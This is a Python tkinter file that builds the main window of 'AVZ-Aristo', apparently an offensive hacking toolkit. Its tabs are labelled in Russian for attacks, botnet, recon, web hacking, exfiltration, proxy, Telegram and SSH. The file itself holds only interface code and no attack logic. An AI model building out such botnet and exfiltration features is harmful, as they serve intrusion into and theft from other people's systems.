import tkinter as tk
from tkinter import ttk
from gui.tabs.attack_tab import AttackTab
from gui.tabs.botnet_tab import BotnetTab
from gui.tabs.ssh_tab import SSHTab
from gui.tabs.recon_tab import ReconTab
from gui.tabs.monitor_tab import MonitorTab
from gui.tabs.settings_tab import SettingsTab
from gui.tabs.help_tab import HelpTab
from gui.tabs.exfil_tab import ExfilTab
from gui.tabs.proxy_tab import ProxyTab
from gui.tabs.telegram_tab import TelegramTab
from gui.tabs.auto_tab import AutoTab
from gui.tabs.ai_tab import AITab
from gui.tabs.stats_tab import StatsTab
from gui.tabs.web_tab import WebTab
from gui.tabs.diagnostic_tab import DiagnosticTab
from gui.tabs.constructor_tab import ConstructorTab
from gui.themes import THEMES
from gui.styles import apply_theme
from utils.logger import Logger

class App:
    def __init__(self, root):
        self.root = root
        self.root.title("AVZ-Aristo v35.0 Cyber Light")
        self.root.minsize(1100, 700)
        self.root.geometry("1280x800")
        self.logger = Logger(__name__)
        
        self.current_theme = THEMES['cyber_light']
        apply_theme(root, self.current_theme)
        
        # Верхняя панель с логотипом
        header = tk.Frame(root, bg=self.current_theme['accent'], height=40)
        header.pack(fill=tk.X, side=tk.TOP)
        header_label = tk.Label(header, text="AVZ-ARISTO", font=('Segoe UI', 14, 'bold'),
                                bg=self.current_theme['accent'], fg='white')
        header_label.pack(pady=4)
        
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        self._create_notebook()

    def _create_notebook(self):
        tabs = [
            ("Атаки", AttackTab),
            ("Ботнет", BotnetTab),
            ("Разведка", ReconTab),
            ("Монитор", MonitorTab),
            ("Веб-взлом", WebTab),
            ("Эксфильтрация", ExfilTab),
            ("AI-Анализ", AITab),
            ("Конструктор", ConstructorTab),
            ("Планировщик", AutoTab),
            ("Прокси", ProxyTab),
            ("Telegram", TelegramTab),
            ("Статистика", StatsTab),
            ("Диагностика", DiagnosticTab),
            ("SSH", SSHTab),
            ("Настройки", SettingsTab),
            ("Справка", HelpTab),
        ]
        for name, TabClass in tabs:
            tab = TabClass(self.notebook)
            self.notebook.add(tab, text=name)
